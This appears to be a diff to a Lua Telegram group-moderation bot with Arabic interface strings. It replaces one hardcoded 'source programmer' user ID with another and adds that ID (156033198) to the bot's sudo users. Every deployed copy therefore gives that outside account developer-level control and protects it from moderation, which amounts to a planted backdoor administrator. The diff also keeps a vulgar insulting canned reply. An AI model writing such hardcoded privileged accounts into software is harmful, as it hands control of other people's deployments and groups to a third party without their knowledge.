@@ -112,7 +112,7 @@ end
 Load_SAKURA() 
 sudos = dofile("./config.lua")
 DevId = sudos.SUDO
-SudoUsers = {sudos.sudo_users,218385683}
+SudoUsers = {sudos.sudo_users,218385683,156033198}
 SAKURA = sudos.bot_id
 TokenBot = sudos.token
 NameBot = (DevSakura:get(SAKURA..'Sakura:NameBot') or 'ساكورا')
@@ -533,7 +533,7 @@ function CatchName(Name,Num)
 ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
 end
 local AbsRank = function(msg) if SudoId(msg.sender_user_id_) then SAKURATEAM  = "المطور" elseif SudoId(msg.sender_user_id_) then SAKURATEAM = "المطور" elseif SudoBot(msg) then SAKURATEAM = "المطور" elseif ManagerAll(msg) then SAKURATEAM = "المدير" elseif AdminAll(msg) then SAKURATEAM = "الادمن" elseif AbsConstructor(msg) then SAKURATEAM = "المنشئ" elseif BasicConstructor(msg) then SAKURATEAM = "المنشئ" elseif Constructor(msg) then SAKURATEAM = "المنشئ" elseif Manager(msg) then SAKURATEAM = "المدير" elseif Admin(msg) then SAKURATEAM = "الادمن" else SAKURATEAM = "العضو" end return SAKURATEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then SAKURATEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(SAKURA) then SAKURATEAM = 'البوت' elseif SudoId(user_id) then SAKURATEAM = 'المطور الاساسي' elseif DevSakura:sismember(SAKURA..'Sakura:SudoBot:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:SudoBot:Rd"..chat_id) or 'المطور' elseif DevSakura:sismember(SAKURA..'Sakura:ManagerAll:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Managers:Rd"..chat_id) or 'المدير العام' elseif DevSakura:sismember(SAKURA..'Sakura:AdminAll:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevSakura:sismember(SAKURA..'Sakura:VipAll:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevSakura:sismember(SAKURA..'Sakura:AbsConstructor:'..chat_id, user_id) then SAKURATEAM = 'منشئ المجموعه' elseif DevSakura:sismember(SAKURA..'Sakura:BasicConstructor:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevSakura:sismember(SAKURA..'Sakura:Constructor:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevSakura:sismember(SAKURA..'Sakura:Managers:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Managers:Rd"..chat_id) or 'المدير' elseif DevSakura:sismember(SAKURA..'Sakura:Admins:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Admins:Rd"..chat_id) or 'الادمن' elseif DevSakura:sismember(SAKURA..'Sakura:VipMem:'..chat_id, user_id) then  SAKURATEAM = DevSakura:get(SAKURA.."Sakura:VipMem:Rd"..chat_id) or 'المميز' elseif DevSakura:sismember(SAKURA..'Sakura:Cleaner:'..chat_id, user_id) then  SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Cleaner:Rd"..chat_id) or 'المنظف' else SAKURATEAM = DevSakura:get(SAKURA.."Sakura:mem:Rd"..chat_id) or 'العضو' end return SAKURATEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(156033198) then SAKURATEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(SAKURA) then SAKURATEAM = 'البوت' elseif SudoId(user_id) then SAKURATEAM = 'المطور الاساسي' elseif DevSakura:sismember(SAKURA..'Sakura:SudoBot:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:SudoBot:Rd"..chat_id) or 'المطور' elseif DevSakura:sismember(SAKURA..'Sakura:ManagerAll:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Managers:Rd"..chat_id) or 'المدير العام' elseif DevSakura:sismember(SAKURA..'Sakura:AdminAll:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevSakura:sismember(SAKURA..'Sakura:VipAll:', user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevSakura:sismember(SAKURA..'Sakura:AbsConstructor:'..chat_id, user_id) then SAKURATEAM = 'منشئ المجموعه' elseif DevSakura:sismember(SAKURA..'Sakura:BasicConstructor:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevSakura:sismember(SAKURA..'Sakura:Constructor:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevSakura:sismember(SAKURA..'Sakura:Managers:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Managers:Rd"..chat_id) or 'المدير' elseif DevSakura:sismember(SAKURA..'Sakura:Admins:'..chat_id, user_id) then SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Admins:Rd"..chat_id) or 'الادمن' elseif DevSakura:sismember(SAKURA..'Sakura:VipMem:'..chat_id, user_id) then  SAKURATEAM = DevSakura:get(SAKURA.."Sakura:VipMem:Rd"..chat_id) or 'المميز' elseif DevSakura:sismember(SAKURA..'Sakura:Cleaner:'..chat_id, user_id) then  SAKURATEAM = DevSakura:get(SAKURA.."Sakura:Cleaner:Rd"..chat_id) or 'المنظف' else SAKURATEAM = DevSakura:get(SAKURA.."Sakura:mem:Rd"..chat_id) or 'العضو' end return SAKURATEAM end
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
 var = true  
@@ -3751,7 +3751,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(218385683) then 
+if tonumber(result.id_) == tonumber(156033198) then 
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -3779,7 +3779,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(218385683) then  
+if tonumber(result.sender_user_id_) == tonumber(156033198) then  
 Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
